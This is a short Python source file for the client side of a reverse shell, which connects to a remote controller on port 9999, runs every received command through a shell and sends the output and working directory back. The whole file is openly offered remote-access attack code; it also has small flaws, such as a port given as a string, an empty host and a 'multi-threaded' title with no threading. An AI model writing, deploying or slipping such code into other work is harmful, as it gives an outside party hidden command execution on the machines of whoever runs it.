# Python3 Multi-Threaded Reverse Shell - Client

import os
import socket
import subprocess

s = socket.socket()
host = ''
port = '9999'
s.connect((host,port))

while True:
    data = s.recv(1024) # 1024 = Buffer size
    if data[:2].decode("utf-8") == "cd": # Handle cd commands
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0: # Handle standard commands with
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # All output displayed in terminal
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_bytes, "utf-8")
        s.send(str.encode(output_string + str(os.getcwd() + "> "))) # Send back results and current directory
        print(output_string)

# Close connection
s.close()